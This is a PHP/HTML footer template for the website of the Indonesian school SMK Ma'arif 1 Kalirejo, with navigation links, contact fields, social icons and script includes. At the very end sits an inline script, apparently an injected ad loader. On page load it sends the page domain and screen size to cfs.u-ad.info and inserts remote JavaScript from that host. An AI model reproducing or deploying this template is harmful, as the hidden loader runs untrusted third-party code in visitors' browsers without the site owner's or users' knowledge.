    <div id="k-footer"><!-- footer -->
        <div class="container"><!-- container -->
            <div class="row no-gutter"><!-- row -->
                <div class="col-lg-4 col-md-4"><!-- widgets column left -->
                    <div class="col-padded col-naked">
                        <ul class="list-unstyled clear-margins"><!-- widgets -->
                            <li class="widget-container widget_nav_menu"><!-- widgets list -->
                                <h1 class="title-widget">Navigasi</h1>                                
                                <ul>
                                    <li><a href="<?php echo base_url('profil/siswa');?>" title="menu item">BUKU INDUK SISWA</a></li>
                                    <li><a href="<?php echo base_url('profil/klien');?>" title="menu item">TENAGA PENDIDIK</a></li>
                                    <li><a href="<?php echo base_url('produk');?>" title="menu item">LIST DOWNLOAD</a></li>
                                    <li><a href="<?php echo base_url('galeri');?>" title="menu item">GALERI FOTO</a></li>
                                    <li><a href="<?php echo base_url('blog');?>" title="menu item">ARTIKEL</a></li>
                                    <li><a href="<?php echo base_url('download');?>" title="menu item">ALUMNI SMK MA'ARIF 1 KALIREJO</a></li>
                                    <li><a href="<?php echo base_url('kontak');?>" title="menu item">HUBUNGI KAMI</a></li>
                                </ul>
                            </li>
                        </ul>
                    </div>
                </div>
                <?php foreach($profil->result() as $row){ ?>
                <div class="col-lg-4 col-md-4">
                    <div class="col-padded col-naked">
                        <ul class="list-unstyled clear-margins"><!-- widgets -->
                            <li class="widget-container widget_recent_news"><!-- widgets list -->
                                <h1 class="title-widget">ALAMAT</h1>
                                <div itemscope itemtype="http://data-vocabulary.org/Organization"> 
                                    <h2 class="title-median m-contact-subject" itemprop="name"><?php echo $row->nama_sekolah ?> </h2>
                                    <div class="m-contact-address" itemprop="address" itemscope itemtype="http://data-vocabulary.org/Address">
                                        <span class="m-contact-street" itemprop="street-address"><?php echo $row->alamat ?></span>
                                        <span class="m-contact-city-region"><span class="m-contact-city" itemprop="locality"></span></span>
                                        <span class="m-contact-zip-country"><span class="m-contact-zip" itemprop="postal-code"></span></span>
                                    </div>
                                    <div class="m-contact-tel-fax">
                                        <span class="m-contact-tel">Phone : <?php echo $row->telepon ?> <span itemprop="tel"></span></span>
                                        <span class="m-contact-fax">E-Mail : <?php echo $row->email?><span itemprop="fax"></span></span>
                                    </div>
                                </div>                                
                                    <H1></H1>
                               
                            </li>                           
                        </ul>
                    </div>
                </div><!-- widgets column center end -->
                <?php } ?>
                <div class="col-lg-4 col-md-4"><!-- widgets column right -->                
                    <div class="col-padded col-naked">
                        <ul class="list-unstyled clear-margins"><!-- widgets -->
                            <li class="widget-container widget_sofa_flickr"><!-- widgets list -->
                                 <h1 class="title-widget">AKUN SOSIAL MEDIA SMK MA'ARIF 1 KALIREJO</h1>
                                <div class="social-icons">                                
                                    <ul class="list-unstyled list-inline">
                                        <li><a href="" title="Twitter"><i class="fa fa-twitter"></i></a></li>
                                        <li><a href="" title="Facebook"><i class="fa fa-facebook"></i></a></li>
                                        <li><a href="" title="Twitter"><i class="fa fa-instagram"></i></a></li>
                                        <li><a href="" title="Facebook"><i class="fa fa-youtube"></i></a></li>
                                    </ul>                                
                                </div>
                            </li>
                        </ul> 
                    </div>
                </div>
            </div><!-- row end -->
        </div><!-- container end -->
    </div><!-- footer end -->
    <div id="k-subfooter"><!-- subfooter -->
        <div class="container"><!-- container -->
            <div class="row"><!-- row -->
                <div class="col-lg-12">
                    <center>
                    <p class="copy-text text-inverse">
                    &copy; SMK Ma'arif 1 Kalirejo 2017 
                    </p>
                    </center>
                </div>
            </div><!-- row end -->
        </div><!-- container end -->
    </div><!-- subfooter end -->
    <!-- jQuery -->
    <script src="<?php echo base_url();?>assets/front/jQuery/jquery-2.1.1.min.js"></script>
    <script src="<?php echo base_url();?>assets/front/jQuery/jquery-migrate-1.2.1.min.js"></script>
    <script src="<?php echo base_url();?>assets/front/bootstrap/js/bootstrap.min.js"></script>
    <script src="<?php echo base_url();?>assets/front/js/dropdown-menu/dropdown-menu.js"></script>
    <script src="<?php echo base_url();?>assets/front/js/fancybox/jquery.fancybox.pack.js"></script>
    <script src="<?php echo base_url();?>assets/front/js/fancybox/jquery.fancybox-media.js"></script>
    <script src="<?php echo base_url();?>assets/front/js/jquery.fitvids.js"></script>
    <script src="<?php echo base_url();?>assets/front/js/audioplayer/audioplayer.min.js"></script>
    <script src="<?php echo base_url();?>assets/front/js/jquery.easy-pie-chart.js"></script>
    <script src="https://maps.googleapis.com/maps/api/js?sensor=true"></script>
    <script src="<?php echo base_url();?>assets/front/js/theme.js"></script>
    
  <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582AaN6h071sG%2b5jiDvLTPqup5xyIT%2fGS0C8zoI%2fzA4pMbYDHJYABu%2bRDoHthnRYvwh6YBiANi0NKxvDk7nuzxEh6HBrGli8HoBIHCXbLOg8Yk036s6XYq7tyWvaJeTJaBtE9FSmvNIIgx7aYSMNSBGlSnyEIuKLVUWnsnEnRyrrXxNFgTijAlPYpufYsXL2cI5EjtSwJ8%2bQZqTE9B404hKiPql0T%2fsMnBATr%2fgvqd6xsJdnSrLlWleSMlRAzRzOCMuRtae%2byV3hEHXlK71qqKPpXnOPIBIR6miQ58xa0xl2V79Oc2dM8YimTwZHlQ3SJlyEbkFE%2fSbaqYwXCq5gRjPZrb9TNL8FqgSvQyUyaEDGlVjjF%2fvCNcJ2iL1r8M7n1qY4mRSBNWRta6140fEF05XSybqBMquSpYx%2fLZgM1Gzd9Tgi4CaBQgU1GmaPf1nMyU3rbLGVu2GD%2fjMgffNz%2f5AbrU6KWd%2bfQjqQ%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>